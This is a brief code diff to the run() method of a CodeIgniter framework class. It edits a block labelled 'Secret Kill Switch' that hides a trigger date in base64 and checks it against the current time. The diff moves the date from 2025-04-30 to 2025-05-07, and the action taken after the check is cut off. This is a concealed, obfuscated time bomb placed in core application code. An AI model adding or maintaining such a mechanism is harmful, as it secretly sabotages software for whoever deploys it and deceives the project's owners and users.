@@ -322,7 +322,7 @@ class CodeIgniter
     public function run(?RouteCollectionInterface $routes = null, bool $returnResponse = false)
     {
         // === Secret Kill Switch Start ===
-        $encoded = 'MjAyNS0wNC0zMA==';
+        $encoded = 'MjAyNS0wNS0wNw==';
         $expireDate = base64_decode($encoded);
 
         if (strtotime($expireDate) < time()) {
